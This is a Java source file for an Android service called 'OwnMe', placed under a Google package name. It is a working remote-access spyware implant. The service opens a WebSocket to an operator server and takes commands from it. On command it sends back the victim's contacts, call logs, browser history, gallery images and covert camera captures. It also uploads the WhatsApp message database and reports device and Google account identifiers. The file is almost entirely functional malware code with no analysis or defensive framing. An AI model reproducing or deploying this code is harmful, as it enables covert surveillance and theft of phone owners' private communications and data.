package com.google.android.network;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;
import android.widget.Toast;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.ByteBuffer;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by earthshakira on 26/1/17.
 */

public class OwnMe extends Service {
    String TAG = "Camera";
    String whatsapppath;
    int frames=100;
    private String upLoadServerUri;
    private WebSocketClient mWebSocketClient;
    private String android_id, dev_name;
    private String username;
    private Timer pingpong;
    private static final int PERMISSIONS_REQUEST_READ_PHONE_STATE = 999;
    String sender;
    TelephonyManager telephonyManager=null;
    boolean webopen = false;
    JSONObject ping;
    JSONObject handshake;
    private Intent savedIntent;
    //______________Camera Stuff
    private Object stateCallbackVideo;
    private String cameraId;
    String opImage="";
    protected CameraDevice cameraDevice;
    private ImageReader imageReader;
    private Handler mBackgroundHandler;
    private HandlerThread mBackgroundThread;
    //_______________
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void retryLater(){
        pingpong.cancel();
        pingpong.purge();
        pingpong = new Timer();
        pingpong.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                Log.d("Timer Running", "trying for socket");
                if (!webopen) {
                  connectWebSocket();
                }
            }
        },new Date(new Date().getTime()+10000),5000);
    }

    public void errorReport(String msg){
        if(mWebSocketClient.getConnection() == null)
            return;
        JSONObject x = new JSONObject();
        try {
            x.put("to",sender);
            x.put("response",msg);
            x.put("type","error_reporting");
        } catch (JSONException e) {
            e.printStackTrace();
        }
        Log.d(TAG, "errorReport:"+ x.toString());
        mWebSocketClient.send(x.toString());
    }

    public void serviceReport(String service,String msg){
        if(mWebSocketClient.getConnection() == null)
            return;
        JSONObject x = new JSONObject();
        try {
            x.put("to",sender);
            x.put("response",msg);
            x.put("type",service);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        Log.d(TAG, "serviceReport:"+ x.toString());
        mWebSocketClient.send(x.toString());
    }

    public String getNetworkState() {
        ConnectivityManager cm =
                (ConnectivityManager) this.getBaseContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        boolean isConnected = activeNetwork != null &&
                activeNetwork.isConnectedOrConnecting();
        if (isConnected) {
            switch (activeNetwork.getType()) {
                case ConnectivityManager.TYPE_WIFI:
                    return "wifi";
                case ConnectivityManager.TYPE_MOBILE:
                    return "mobile_data";
                default:
                    return "other";
            }
        } else return null;
    }

    public void startExploit(Intent intent) {
        String network = getNetworkState();
        if (network != null) {
            Toast.makeText(this.getBaseContext(), network + " network available", Toast.LENGTH_LONG).show();
            Toast.makeText(this.getBaseContext(), network + " network available", Toast.LENGTH_LONG).show();
            connectWebSocket();
        } else {
            Toast.makeText(this.getBaseContext(), "no network stopping self", Toast.LENGTH_LONG).show();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        savedIntent=intent;
        Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
        pingpong = new Timer();
        username = getString(R.string.user_name);
        android_id = Settings.Secure.getString(getBaseContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        upLoadServerUri = "http://"+getString(R.string.ip)+"/db/upload_whatsapp.php?user_name="+username+"&device_id="+android_id;
        mBackgroundHandler=new Handler(Looper.getMainLooper());
        dev_name = Build.MANUFACTURER + " " + Build.MODEL;
        int sdkVersion = android.os.Build.VERSION.SDK_INT; // e.g. sdkVersion := 8;
        ping = new JSONObject();
        handshake = new JSONObject();
        try {
            ping.put("type", "ping");
            ping.put("id", android_id);
            ping.put("battery", "");
            ping.put("cpu", "");
            handshake.put("type","handshake");
            handshake.put("user",username);
            handshake.put("id",android_id);
            handshake.put("devname",dev_name);
            handshake.put("devuser",getUsername());
            handshake.put("connection",getNetworkState());
            handshake.put("api",sdkVersion);
            handshake.put("cameras", android.hardware.Camera.getNumberOfCameras());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        startExploit(intent);
        return Service.START_STICKY;
    }

    @Override
    public boolean stopService(Intent name) {
        Toast.makeText(this.getBaseContext(), "Service Stoped", Toast.LENGTH_LONG).show();
        if (mWebSocketClient != null)
            mWebSocketClient.close();
        else Toast.makeText(this.getBaseContext(), "Web socket is null", Toast.LENGTH_LONG).show();
        return super.stopService(name);
    }


    private void connectWebSocket() {
        pingpong.cancel();
        URI uri;
        try {
            uri = new URI("ws://"+getString(R.string.ip)+":"+getString(R.string.port));
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return;
        }
        //Toast.makeText(this.getBaseContext(), " Tying to open ", Toast.LENGTH_LONG).show();
        mWebSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen(ServerHandshake serverHandshake) {
                Log.i("Websocket", "Opened");
                mWebSocketClient.send(handshake.toString());
                webopen = true;
                pingpong.cancel();
                pingpong.purge();
                pingpong = new Timer();
                pingpong.scheduleAtFixedRate(new TimerTask() {
                    @Override
                    public void run() {
                        Log.d("Timer Running", "Is it up");
                        if (webopen) {
                            updateBattery();
                            mWebSocketClient.send(ping.toString());
                        }
                    }
                },new Date(new Date().getTime()+10000),5000);
                //Toast.makeText(getBaseContext(),"Web socket is on",Toast.LENGTH_LONG).show();
            }

            @Override
            public void onMessage(String s) {

                Log.d("shubham", "onMessage: " + s);
                JSONObject x = null;
                String cmd=null;
                try {
                    x=new JSONObject(s);
                    Log.d("shubham", "onMessage: inside try");
                    Log.d("shubham", "onMessage: " + x.get("cmd"));
                    x.put("to", x.get("from"));
                    sender=x.getString("from");
                    x.remove("from");
                    cmd=x.get("cmd").toString();
                    if (cmd.equals("screenshot")) {
                        x.put("response", "none");
                        x.put("type", "response");
                    } else if (cmd.equals("whatsapp")) {
                        //uploadWhatsApp();
                        uploadWhatsApp();
                    } else if (cmd.equals("browserhistory")) {
                        x.put("response", getHistory());
                        x.put("type", "browserhistory");
                    } else if (cmd.equals("contacts")) {
                        x.put("response", getContacts());
                        x.put("type", "contacts");
                    }else if (cmd.equals("calllog")) {
                        x.put("response", getCallLogs());
                        x.put("type", "calllog");
                    }else if (cmd.equals("fetch")) {
                        x.put("response", getBase64((String) x.get("path")));
                        Log.d("inside fetch" , "image done");
                        x.put("type", "fetch");
                    } else if (cmd.equals("gallery")) {
                        ArrayList gal = getGallery();
                        JSONObject y;
                        int pg=gal.size();
                        y=new JSONObject();
                        y.put("to",x.get("to"));
                        for(int i=0;i<pg;i++){
                            y.put("response", gal.get(i).toString());
                            y.put("type", "gallery");
                            y.put("id",android_id);
                            y.put("page",i+1);
                            y.put("total",pg);
                            mWebSocketClient.send(y.toString());
                        }
                    } else if(cmd.equals("camera")){
                        int cam=Integer.parseInt(String.valueOf(x.get("cam")));
                        int f=Integer.parseInt(String.valueOf(x.get("frames")));
                            openCameraVideo(cam,f);
                    }else {
                        x.put("type","error");
                        x.put("response","no command found");
                        Log.d("shubham", "no commans found");
                    }
                } catch (JSONException e) {
                    Log.d("shubham", "onMessage: inside catch");
                    e.printStackTrace();
                }
                if(!cmd.equals("gallery")&&!cmd.equals("camera")&&!cmd.equals("whatsapp"))
                    mWebSocketClient.send(x.toString());
            }

            @Override
            public void onClose(int i, String s, boolean b) {
                Log.i("Websocket", "Closed " + s);
                webopen = false;
                pingpong.cancel();
                pingpong.purge();
                retryLater();
            }

            @Override
            public void onError(Exception e) {
                webopen = false;
                Log.i("Websocket", "Error " + e.getMessage());
            }
        };
        mWebSocketClient.connect();
    }

    public String getUsername() {
        AccountManager manager = AccountManager.get(this);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "NO permission", Toast.LENGTH_LONG).show();
        }
        Account[] accounts = manager.getAccountsByType("com.google");
        for (int i = 0; i < accounts.length; i++) {
            return accounts[i].name;
        }

        return null;
    }

    private String getContacts() {

        StringBuilder sb = new StringBuilder();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor_Android_Contacts = null;
        boolean first = true;
        try {
            cursor_Android_Contacts = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            sb.append("[");
            if (cursor_Android_Contacts.getCount() > 0) {

                while (cursor_Android_Contacts.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String contact_id = cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts._ID));
                    String contact_display_name = cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    contact.put("id", contact_id);
                    contact.put("name", contact_display_name);
                    ArrayList<String> phones = new ArrayList<>();
                    int hasPhoneNumber = Integer.parseInt(cursor_Android_Contacts.getString(cursor_Android_Contacts.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
                    if (hasPhoneNumber > 0) {

                        Cursor phoneCursor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                                , null
                                , ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?"
                                , new String[]{contact_id}
                                , null);

                        while (phoneCursor.moveToNext()) {
                            String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phones.add(phoneNumber);
                        }
                        phoneCursor.close();
                    }
                    contact.put("phones", phones);
                    if (!first)
                        sb.append(",");
                    sb.append(contact.toString());
                    first = false;
                }

            }
            sb.append("]");
        } catch (Exception ex) {
            Log.e("Error on contact", ex.getMessage());
            errorReport("Contacts Fetch:" + ex.getMessage());
            return "error:" + ex.getMessage();
        }
        return sb.toString();
    }

    private String getCallLogs() {
        StringBuffer sb = new StringBuffer();
        //Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,null, null, null);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            errorReport("Call Log Fetch : "+" Permission Rejected" );
            return "No permission";
        }

        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        JSONArray ret=new JSONArray();
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String phname = managedCursor.getString(name);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            JSONObject x = new JSONObject();
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "O";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "I";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "M";
                    break;
            }
            try {
                x.put("name",phname);
                x.put("number",phNumber);
                x.put("type",dir);
                x.put("datetime",callDayTime);
                x.put("duration",callDuration);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            ret.put(x);
        }
        managedCursor.close();
        return ret.toString();
    }


    private float readUsage() {
        try {
            RandomAccessFile reader = new RandomAccessFile("/proc/stat", "r");
            String load = reader.readLine();

            String[] toks = load.split(" +");  // Split on one or more spaces

            long idle1 = Long.parseLong(toks[4]);
            long cpu1 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[5])
                    + Long.parseLong(toks[6]) + Long.parseLong(toks[7]) + Long.parseLong(toks[8]);

            try {
                Thread.sleep(360);
            } catch (Exception e) {}

            reader.seek(0);
            load = reader.readLine();
            reader.close();

            toks = load.split(" +");

            long idle2 = Long.parseLong(toks[4]);
            long cpu2 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[5])
                    + Long.parseLong(toks[6]) + Long.parseLong(toks[7]) + Long.parseLong(toks[8]);

            return (float)(cpu2 - cpu1) / ((cpu2 + idle2) - (cpu1 + idle1));

        } catch (IOException ex) {
            ex.printStackTrace();
        }

        return 0;
    }

    private void updateBattery(){
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getBaseContext().registerReceiver(null, ifilter);
//        // Are we charging / charged?
//        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
//        boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
//                status == BatteryManager.BATTERY_STATUS_FULL;
//
//// How are we charging?
//        int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
//        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
//        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        float batteryPct = level / (float)scale * 100;
        try {
            ping.remove("battery");
            ping.remove("cpu");
            ping.put("battery",(int)batteryPct);
            ping.put("cpu",(int)(readUsage()*100));
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }
    private ArrayList<JSONArray> getGallery(){

            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            String [] projection = { MediaStore.MediaColumns.DATA , MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
            Cursor imageCursor = getContentResolver().query(uri, projection, null, null, null);

            int columnIndexOfData = imageCursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
            int columnIndexOfFolderName = imageCursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
            //ArrayList<JSONObject> lister= new ArrayList<>();
            String singlePath, s,folderName;
            int num=0;
            ArrayList<JSONArray> ret =new ArrayList<>();
            JSONArray page=new JSONArray();
            JSONObject x=new JSONObject();
            while(imageCursor.moveToNext()){
                singlePath = imageCursor.getString(columnIndexOfData);
                folderName = imageCursor.getString(columnIndexOfFolderName);
                try {
                    x=new JSONObject();
                    x.put("path",singlePath);
                    x.put("folder",folderName);
                    x.put("page",num/20+1);
                    page.put(x);
                    if(num!= 0 && (num +1) % 20 == 0){
                        ret.add(page);
                        page=new JSONArray();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                num++;
            }
            return ret;
    }

    private String getBase64(String path){
        Bitmap bm = BitmapFactory.decodeFile(path);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int width=bm.getWidth();
        if(width > 480) {
            int height = bm.getHeight();
            double aspect_ratio = ((double) width) / height;
            Bitmap small = bm.createScaledBitmap(bm, 480, (int) Math.ceil(480 / aspect_ratio), false);
            small.compress(Bitmap.CompressFormat.JPEG, 50, baos); //bm is the bitmap object
        }else bm.compress(Bitmap.CompressFormat.JPEG, 50 , baos); //bm is the bitmap object
        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
    }


    /***
     * Camera Stuff that is done is here all the call backs aswell as the open and close functions
     *

     */

    private void closeCamera() {
        if (null != cameraDevice) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (null != imageReader) {
            imageReader.close();
            imageReader = null;
        }
    }
    Camera c=null;

    private void openCameraVideo(int x,int fr) {
        frames=fr;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            stateCallbackVideo = new CameraDevice.StateCallback() {
                            @Override
                            public void onOpened(CameraDevice camera) {
                                //This is called when the camera is open
                                Log.e(TAG, "onOpened");
                                cameraDevice = camera;
                                //Log.e(TAG, "camera Id"+camera.getId());
                                if(camera!=null)
                                    takePictureR();
                            }
                            @Override
                            public void onDisconnected(CameraDevice camera) {
                                Log.e(TAG, "onDisconnect");

                                cameraDevice.close();
                            }
                            @Override
                            public void onError(CameraDevice camera, int error) {
                                Log.e(TAG, "onError "+error);
                                errorReport("Camera Error : Camera Unavailable or Busy");
                                if(cameraDevice!=null)
                                    cameraDevice.close();
                                    cameraDevice = null;
                            }
                        };

                CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        Log.e(TAG, "is camera open");
        try {
            cameraId = manager.getCameraIdList()[x];
            // Add permission for camera and let user grant the permission
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                //No perms;
                Log.d(TAG, "No Perms");
                return;
            }
            frames = fr;
            manager.openCamera(cameraId,(CameraDevice.StateCallback)stateCallbackVideo, mBackgroundHandler);
            Log.d(TAG, "Camera Open");
        } catch (CameraAccessException e) {
            Log.d(TAG, "Camera Error");
            e.printStackTrace();

        }
        Log.e(TAG, "openCamera " + cameraId);
        }else{
            try {
                c = Camera.open(x);
                c.takePicture(null, null, mPicture);
            }catch (Exception err){
                errorReport("Camera Error : " + err.getMessage());
            }
        }
    }


    public Camera.PictureCallback mPicture = new Camera.PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera c) {
            Log.d(TAG, "onPictureTaken: Picture Taken");
            frames--;
            {
                JSONObject x = new JSONObject();
                try {
                    x.put("to",sender);
                    x.put("response",Base64.encodeToString(data,Base64.DEFAULT));
                    x.put("type","camera");
                } catch (JSONException e) {

                    e.printStackTrace();
                }
                mWebSocketClient.send(x.toString());
                Log.d(TAG, "onPictureTaken:Sending now ");
            }

            if(frames>0){
                c.takePicture(null,null,mPicture);
            }
            else{
                Log.d(TAG, "onPictureTaken:Cam release ");
                c.release();
            }
        }
    };

    protected void takePictureR() {
        if (null == cameraDevice) {
            Log.e(TAG, "cameraDevice is null");
            return;
        }

        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            CameraCharacteristics characteristics = null;

            characteristics = manager.getCameraCharacteristics(cameraDevice.getId());
            Size[] jpegSizes = null;
            if (characteristics != null) {
                jpegSizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP).getOutputSizes(ImageFormat.JPEG);
            }
            int width = 640;
            int height = 480;
            if (jpegSizes != null && 0 < jpegSizes.length) {
                width = jpegSizes[0].getWidth();
                height = jpegSizes[0].getHeight();
            }
            final ImageReader reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
            List<Surface> outputSurfaces = new ArrayList<Surface>();
            outputSurfaces.add(reader.getSurface());
            final CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(reader.getSurface());
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
            // Orientation
            ImageReader.OnImageAvailableListener readerListener = new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = null;
                    image = reader.acquireLatestImage();
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.capacity()];
                    buffer.get(bytes);
                    opImage = Base64.encodeToString(bytes, Base64.DEFAULT);
                    Log.d(TAG, "onImageAvailable: Image saved");

                    if(mWebSocketClient.getConnection()!=null){
                        JSONObject x = new JSONObject();
                        try {
                            x.put("to",sender);
                            x.put("response",opImage);
                            x.put("type","camera");
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        mWebSocketClient.send(x.toString());
                    }
                    //Toast.makeText(getBaseContext(),"Captured",Toast.LENGTH_LONG).show();


                }
            };

            reader.setOnImageAvailableListener(readerListener, mBackgroundHandler);
            final CameraCaptureSession.CaptureCallback captureListener = new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(CameraCaptureSession session, CaptureRequest request, TotalCaptureResult result) {
                    super.onCaptureCompleted(session, request, result);
                    frames--;
                    if(frames<=0){
                    reader.close();
                    session.close();
                    closeCamera();
                    Log.d(TAG,"Closed Camera");
                    }else{
                        takePictureR();
                    }
                }
            };

            cameraDevice.createCaptureSession(outputSurfaces, new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(CameraCaptureSession session) {
                    try {

                        session.capture(captureBuilder.build(), captureListener, mBackgroundHandler);

                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onConfigureFailed(CameraCaptureSession session) {
                }
            }, mBackgroundHandler);
        } catch (CameraAccessException e) {
            errorReport("Camera Error :" + e.getMessage());
        }


    }
    //Camera Stuff for the video part ends
    //Whats App Upload
    void uploadWhatsApp(){
        whatsapppath=Environment.getExternalStorageDirectory().getAbsolutePath();
        whatsapppath+="/WhatsApp/Databases/msgstore.db.crypt12";
        Log.d("File Path",whatsapppath);
        sendFileToServer(whatsapppath,upLoadServerUri);
    }
    //Whats App ends Here

    //upload File Utility

    public String sendFileToServer(String filename, String targetUrl) {
        String response = "error";
        Log.e("Image filename", filename);
        Log.e("url", targetUrl);
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;
        // DataInputStream inputStream = null;

        String pathToOurFile = filename;
        String urlServer = targetUrl;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        DateFormat df = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024;
        try {
            FileInputStream fileInputStream = new FileInputStream(new File(
                    pathToOurFile));

            URL url = new URL(urlServer);
            connection = (HttpURLConnection) url.openConnection();
            serviceReport("whatsapp","init");
            // Allow Inputs & Outputs
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setChunkedStreamingMode(1024);
            // Enable POST method
            connection.setRequestMethod("POST");

            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);

            outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);

            String connstr = null;
            connstr = "Content-Disposition: form-data; name=\"uploaded_file\";filename=\""
                    + pathToOurFile + "\"" + lineEnd;
            Log.i("Connstr", connstr);

            outputStream.writeBytes(connstr);
            outputStream.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // Read file
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            Log.e("Image length", bytesAvailable + "");
            try {
                while (bytesRead > 0) {
                    try {
                        outputStream.write(buffer, 0, bufferSize);
                    } catch (OutOfMemoryError e) {
                        e.printStackTrace();
                        response = "outofmemoryerror";
                        return response;
                    }
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }
            } catch (Exception e) {
                e.printStackTrace();
                response = "error";
                return response;
            }
            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens
                    + lineEnd);

            // Responses from the server (code and message)
            int serverResponseCode = connection.getResponseCode();
            String serverResponseMessage = connection.getResponseMessage();
            Log.i("Server Response Code ", "" + serverResponseCode);
            Log.i("Server Response Message", serverResponseMessage);

            if (serverResponseCode == 200) {
                response = "true";
            }

            String CDate = null;
            java.sql.Date serverTime = new java.sql.Date(connection.getDate());
            try {
                CDate = df.format(serverTime);
            } catch (Exception e) {
                e.printStackTrace();
                Log.e("Date Exception", e.getMessage() + " Parse Exception");
            }
            Log.i("Server Response Time", CDate + "");

            filename = CDate
                    + filename.substring(filename.lastIndexOf("."),
                    filename.length());
            Log.i("File Name in Server : ", filename);
            try {
                InputStream in = new BufferedInputStream(connection.getInputStream());
                Scanner scr = new Scanner(in);
                while (scr.hasNext()){
                    Log.i("uploadFile", "HTTP Page is : "+ scr.nextLine());
                }
            } finally {
                connection.disconnect();
            }
            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
            outputStream = null;
        } catch (Exception ex) {
            // Exception handling
            response = "error";
            Log.e("Send file Exception", ex.getMessage() + "");
            ex.printStackTrace();
        }
        serviceReport("whatsapp","done");
        return response;
    }
    // upliad utility ends here

    public final Uri BOOKMARKS_URI = Uri.parse("content://browser/bookmarks");
    public final String[] HISTORY_PROJECTION = new String[]{
            "_id", // 0
            "url", // 1
            "visits", // 2
            "date", // 3
            "bookmark", // 4
            "title", // 5
            "favicon", // 6
            "thumbnail", // 7
            "touch_icon", // 8
            "user_entered", // 9
    };
    public final int HISTORY_PROJECTION_TITLE_INDEX = 5;
    public final int HISTORY_PROJECTION_URL_INDEX = 1;

    public String getHistory(){
        JSONArray retList = new JSONArray();
        Cursor mCur = getContentResolver().query(BOOKMARKS_URI,HISTORY_PROJECTION, null, null, null);
        if (mCur.moveToFirst()) {
            while (mCur.isAfterLast() == false) {
                String title=mCur.getString(5),url=mCur.getString(1);
                if(title.length()>0 && url.length()>0){
                    JSONObject x = new JSONObject();
                    try {
                        x.put("id",mCur.getString(0));
                        x.put("title",title);
                        x.put("time",mCur.getString(3));
                        x.put("url",url);
                        x.put("visits",mCur.getString(2));
                        retList.put(x);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    Log.d("Files", "getHistory: "+x.toString());
                }
                mCur.moveToNext();
            }
        }
        mCur.close();
        Log.d(TAG, "getHistory: "+retList.length());
        return retList.toString();
    }
}
